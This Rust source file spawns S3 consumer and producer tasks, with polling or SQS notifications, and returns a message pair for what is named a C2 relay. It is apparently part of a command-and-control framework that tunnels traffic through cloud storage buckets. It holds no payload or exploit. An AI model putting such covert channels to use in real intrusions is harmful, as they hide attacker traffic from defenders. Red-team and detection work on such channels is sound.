use super::config::ConsumerBackend;
use crate::s3::{config::S3C2Config, consumer, producer};
use tokio::sync::mpsc;
use tracing::error;
use udc2_relay::C2;

/// Create and spawn the S3 consumer and producer tasks and return a C2 pair.
pub async fn spawn_channel(config: S3C2Config) -> C2 {
    let (c2_in_tx, c2_in_rx) = mpsc::channel(config.buffer_size);
    let (c2_out_tx, c2_out_rx) = mpsc::channel(config.buffer_size);

    // Consumer (S3 -> TS)
    {
        let bucket = config.bucket.clone();
        let tx = c2_in_tx.clone();

        match config.consumer_cfg {
            ConsumerBackend::Polling(cfg) => {
                // Polling consumer: periodically checks S3 for new objects and
                // forwards them into the incoming channel.
                tokio::spawn(async move {
                    if let Err(err) = consumer::consume_poll(bucket, tx, cfg).await {
                        error!(?err, "polling error");
                    }
                })
            }
            ConsumerBackend::Sqs(cfg) => {
                // SQS consumer: listens for SQS notifications and processes them.
                tokio::spawn(async move {
                    if let Err(err) = consumer::consume_notify(tx, cfg).await {
                        error!(?err, "sqs error");
                    }
                })
            }
        };
    }

    // Producer (TS -> S3)
    {
        let cfg = config.producer_cfg;
        let bucket = config.bucket.clone();
        // The producer reads from the outgoing receiver and uploads to S3.
        tokio::spawn(async move { producer::produce(bucket, c2_out_rx, cfg).await });
    }

    C2 {
        tx: c2_out_tx,
        rx: c2_in_rx,
    }
}
